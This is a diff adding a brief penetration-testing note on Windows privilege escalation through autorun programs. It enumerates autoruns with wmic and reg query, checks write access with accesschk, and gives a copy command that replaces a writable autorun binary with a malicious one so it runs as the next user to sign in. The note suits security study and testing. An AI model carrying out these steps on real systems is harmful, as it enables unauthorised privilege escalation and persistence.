@@ -1,0 +1,16 @@
+Running winpeas lists autoruns, But if you want to enumerate manually the Autoruns use below command:
+
+-- [Command 1] wmic startup list brief 
+-- [Command 2] reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+Exploiting the Autoruns:
+
+- Check the autorun binaries
+
+-- .\accesschk.exe /accepteula -uqvwk <username> "C:\File\Path\To\Autorun\Binary"
+
+If File_All_Access then change the original binary with malicious binary with following command:
+
+-- copy "\Windows\Tasks\Malicious\File.exe" "C:\File\Path\To\Autorun\Binary" /Y
+
+When any user like admin or guest signs into the machine then the malicious autorun binary will run as that user.
